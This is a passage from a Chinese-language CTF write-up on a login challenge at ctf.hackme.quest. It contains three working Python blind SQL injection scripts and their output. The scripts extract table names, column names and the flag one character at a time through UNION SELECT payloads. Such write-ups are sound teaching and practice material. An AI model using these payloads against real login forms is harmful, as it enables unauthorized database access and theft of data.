style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff6ac1>import</span> requests
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff6ac1>from</span> bs4 <span style=color:#ff6ac1>import</span> BeautifulSoup
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>datas <span style=color:#ff6ac1>=</span> {<span style=color:#5af78e>&#39;name&#39;</span>: <span style=color:#5af78e>&#39;admin&#39;</span>, <span style=color:#5af78e>&#39;password&#39;</span>: <span style=color:#5af78e>&#34;payload&#34;</span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>table <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff6ac1>for</span> i <span style=color:#ff6ac1>in</span> <span style=color:#ff5c57>range</span>(<span style=color:#ff9f43>1</span>,<span style=color:#ff9f43>128</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>  <span style=color:#ff5c57>print</span>(<span style=color:#ff5c57>str</span>(i)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#34;: &#34;</span>, end<span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>  <span style=color:#ff6ac1>for</span> j <span style=color:#ff6ac1>in</span> <span style=color:#ff5c57>range</span>(<span style=color:#ff9f43>32</span>,<span style=color:#ff9f43>127</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    datas[<span style=color:#5af78e>&#39;password&#39;</span>] <span style=color:#ff6ac1>=</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#5af78e>&#39;</span><span style=color:#5af78e>\\\&#39;</span><span style=color:#5af78e>/**/UNION/**/SELECT/**/1,2,3,IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()),&#39;</span><span style=color:#ff6ac1>+</span><span style=color:#ff5c57>str</span>(i)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#39;,1))=&#34;&#39;</span><span style=color:#ff6ac1>+</span><span style=color:#ff5c57>str</span>(j)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#39;&#34;,1,0)/**/#&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    r <span style=color:#ff6ac1>=</span> requests<span style=color:#ff6ac1>.</span>post(<span style=color:#5af78e>&#39;https://ctf.hackme.quest/login1/&#39;</span>, data<span style=color:#ff6ac1>=</span>datas)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    soup <span style=color:#ff6ac1>=</span> BeautifulSoup(r<span style=color:#ff6ac1>.</span>text, <span style=color:#5af78e>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    text <span style=color:#ff6ac1>=</span> soup<span style=color:#ff6ac1>.</span>find(<span style=color:#5af78e>&#39;h4&#39;</span>)<span style=color:#ff6ac1>.</span>text
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>    <span style=color:#ff6ac1>if</span> text<span style=color:#ff6ac1>==</span><span style=color:#5af78e>&#39;You are admin!&#39;</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>      table <span style=color:#ff6ac1>=</span> table <span style=color:#ff6ac1>+</span> <span style=color:#ff5c57>chr</span>(j)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>      <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>&#34;Table: &#34;</span><span style=color:#ff6ac1>+</span>table)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>      <span style=color:#ff6ac1>break</span>
</span></span></code></pre></div><p>預估整個<code>GROUP_CONCAT(table_name)</code>長度在<code>128</code>以下，所以寫一個跑<code>128</code>次的迴圈。<br>而該迴圈裡面在寫一個迴圈用來陸續填入<code>可視字元範圍</code>比對。</p><p>最後判斷返回的結果若顯示「<code>You are admin!</code>」則表示 server 回應<code>是</code>，這時候就將該字元記錄下來。</p><p>程式執行結果如下：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>$ python3 ctf.php
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>1: Table: <span style=color:#ff9f43>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>2: Table: 0b
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>3: Table: 0bd
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>4: Table: 0bdb
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>5: Table: 0bdb5
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>6: Table: 0bdb54
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>7: Table: 0bdb54c
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>8: Table: 0bdb54c9
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>9: Table: 0bdb54c98
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>10: Table: 0bdb54c981
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>11: Table: 0bdb54c9812
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>12: Table: 0bdb54c98123
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>13: Table: 0bdb54c98123f
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>14: Table: 0bdb54c98123f5
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>15: Table: 0bdb54c98123f55
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>16: Table: 0bdb54c98123f552
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>17: Table: 0bdb54c98123f5526
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>18: Table: 0bdb54c98123f5526c
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>19: Table: 0bdb54c98123f5526cc
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>20: Table: 0bdb54c98123f5526cca
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>21: Table: 0bdb54c98123f5526ccae
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>22: Table: 0bdb54c98123f5526ccaed
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>23: Table: 0bdb54c98123f5526ccaed9
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>24: Table: 0bdb54c98123f5526ccaed98
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>25: Table: 0bdb54c98123f5526ccaed982
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>26: Table: 0bdb54c98123f5526ccaed982d
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>27: Table: 0bdb54c98123f5526ccaed982d2
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>28: Table: 0bdb54c98123f5526ccaed982d20
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>29: Table: 0bdb54c98123f5526ccaed982d200
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>30: Table: 0bdb54c98123f5526ccaed982d2006
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>31: Table: 0bdb54c98123f5526ccaed982d2006a
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>32: Table: 0bdb54c98123f5526ccaed982d2006a9
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>33: Table: 0bdb54c98123f5526ccaed982d2006a9,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>34: Table: 0bdb54c98123f5526ccaed982d2006a9,u
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>35: Table: 0bdb54c98123f5526ccaed982d2006a9,us
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>36: Table: 0bdb54c98123f5526ccaed982d2006a9,use
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>37: Table: 0bdb54c98123f5526ccaed982d2006a9,user
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>38: Table: 0bdb54c98123f5526ccaed982d2006a9,users
</span></span></code></pre></div><p>可以得知有兩個 table <code>0bdb54c98123f5526ccaed982d2006a9</code>及<code>users</code>，flag 應該在前者沒錯了。</p><hr><p>之後繼續用同樣套路盲注<code>column</code>名字：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff6ac1>import</span> requests
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff6ac1>from</span> bs4 <span style=color:#ff6ac1>import</span> BeautifulSoup
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>datas <span style=color:#ff6ac1>=</span> {<span style=color:#5af78e>&#39;name&#39;</span>: <span style=color:#5af78e>&#39;admin&#39;</span>, <span style=color:#5af78e>&#39;password&#39;</span>: <span style=color:#5af78e>&#34;payload&#34;</span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>column <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff6ac1>for</span> i <span style=color:#ff6ac1>in</span> <span style=color:#ff5c57>range</span>(<span style=color:#ff9f43>1</span>,<span style=color:#ff9f43>128</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>  <span style=color:#ff5c57>print</span>(<span style=color:#ff5c57>str</span>(i)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#34;: &#34;</span>, end<span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>  <span style=color:#ff6ac1>for</span> j <span style=color:#ff6ac1>in</span> <span style=color:#ff5c57>range</span>(<span style=color:#ff9f43>32</span>,<span style=color:#ff9f43>127</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    datas[<span style=color:#5af78e>&#39;password&#39;</span>] <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;</span><span style=color:#5af78e>\\\&#39;</span><span style=color:#5af78e>/**/UNION/**/SELECT/**/1,2,3,IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#34;0bdb54c98123f5526ccaed982d2006a9&#34;),&#39;</span><span style=color:#ff6ac1>+</span><span style=color:#ff5c57>str</span>(i)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#39;,1))=&#34;&#39;</span><span style=color:#ff6ac1>+</span><span style=color:#ff5c57>str</span>(j)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#39;&#34;,1,0)/**/#&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    r <span style=color:#ff6ac1>=</span> requests<span style=color:#ff6ac1>.</span>post(<span style=color:#5af78e>&#39;https://ctf.hackme.quest/login1/&#39;</span>, data<span style=color:#ff6ac1>=</span>datas)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    soup <span style=color:#ff6ac1>=</span> BeautifulSoup(r<span style=color:#ff6ac1>.</span>text, <span style=color:#5af78e>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    text <span style=color:#ff6ac1>=</span> soup<span style=color:#ff6ac1>.</span>find(<span style=color:#5af78e>&#39;h4&#39;</span>)<span style=color:#ff6ac1>.</span>text
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff6ac1>if</span> text<span style=color:#ff6ac1>==</span><span style=color:#5af78e>&#39;You are admin!&#39;</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>      column <span style=color:#ff6ac1>=</span> column <span style=color:#ff6ac1>+</span> <span style=color:#ff5c57>chr</span>(j)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>      <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>&#34;Column: &#34;</span><span style=color:#ff6ac1>+</span>column)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>      <span style=color:#ff6ac1>break</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>1: Column: <span style=color:#ff9f43>4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>2: Column: 4a
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>3: Column: 4a3
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span>33: Column: 4a391a11cfa831ca740cf8d00782f3a6,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8</span><span>34: Column: 4a391a11cfa831ca740cf8d00782f3a6,i
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9</span><span>35: Column: 4a391a11cfa831ca740cf8d00782f3a6,id
</span></span></code></pre></div><p>可以看到結果有兩個欄位(<code>UNION SELECT</code>雖然看到是<code>4</code>個欄位，但應該是關聯了<code>users</code>這張 table 所以執行結果應該是沒錯的)</p><hr><p>最後再撈 Flag，查看<code>0bdb54c98123f5526ccaed982d2006a9</code>表中的<code>4a391a11cfa831ca740cf8d00782f3a6</code>欄位：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff6ac1>import</span> requests
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff6ac1>from</span> bs4 <span style=color:#ff6ac1>import</span> BeautifulSoup
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>datas <span style=color:#ff6ac1>=</span> {<span style=color:#5af78e>&#39;name&#39;</span>: <span style=color:#5af78e>&#39;admin&#39;</span>, <span style=color:#5af78e>&#39;password&#39;</span>: <span style=color:#5af78e>&#34;payload&#34;</span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>flag <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#ff6ac1>for</span> i <span style=color:#ff6ac1>in</span> <span style=color:#ff5c57>range</span>(<span style=color:#ff9f43>1</span>,<span style=color:#ff9f43>128</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>  <span style=color:#ff5c57>print</span>(<span style=color:#ff5c57>str</span>(i)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#34;: &#34;</span>, end<span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>  <span style=color:#ff6ac1>for</span> j <span style=color:#ff6ac1>in</span> <span style=color:#ff5c57>range</span>(<span style=color:#ff9f43>32</span>,<span style=color:#ff9f43>127</span>):
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    datas[<span style=color:#5af78e>&#39;password&#39;</span>] <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;</span><span style=color:#5af78e>\\\&#39;</span><span style=color:#5af78e>/**/UNION/**/SELECT/**/1,2,3,IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(4a391a11cfa831ca740cf8d00782f3a6)/**/FROM/**/0bdb54c98123f5526ccaed982d2006a9),&#39;</span><span style=color:#ff6ac1>+</span><span style=color:#ff5c57>str</span>(i)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#39;,1))=&#34;&#39;</span><span style=color:#ff6ac1>+</span><span style=color:#ff5c57>str</span>(j)<span style=color:#ff6ac1>+</span><span style=color:#5af78e>&#39;&#34;,1,0)/**/#&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    r <span style=color:#ff6ac1>=</span> requests<span style=color:#ff6ac1>.</span>post(<span style=color:#5af78e>&#39;https://ctf.hackme.quest/login1/&#39;</span>, data<span style=color:#ff6ac1>=</span>datas)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    soup <span style=color:#ff6ac1>=</span> BeautifulSoup(r<span style=color:#ff6ac1>.</span>text, <span style=color:#5af78e>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    text <span style=color:#ff6ac1>=</span> soup<span style=color:#ff6ac1>.</span>find(<span style=color:#5af78e>&#39;h4&#39;</span>)<span style=color:#ff6ac1>.</span>text
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff6ac1>if</span> text<span style=color:#ff6ac1>==</span><span style=color:#5af78e>&#39;You are admin!&#39;</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>      flag <span style=color:#ff6ac1>=</span> flag <span style=color:#ff6ac1>+</span> <span style=color:#ff5c57>chr</span>(j)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>      <span style=color:#ff5c57>print</span>(<span style=color:#5af78e>&#34;Flag: &#34;</span><span style=color:#ff6ac1>+</span>flag)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>      <span style=color:#ff6ac1>break</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>1: Flag: F
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>2: Flag: FL
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>3: Flag: FLA
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>4: Flag: FLAG
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>5: Flag: FLAG<span style=color:#ff6ac1>{</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>6: Flag: FLAG<span style=color:#ff6ac1>{</span>W
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>7: Flag: FLAG<span style=color:#ff6ac1>{</span>W0
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>8: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>9: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>10: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, 
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>11: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, Y
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>12: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, Yo
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>13: Flag: FLAG<span style=color:#ff6ac1>{</span>W0W, You
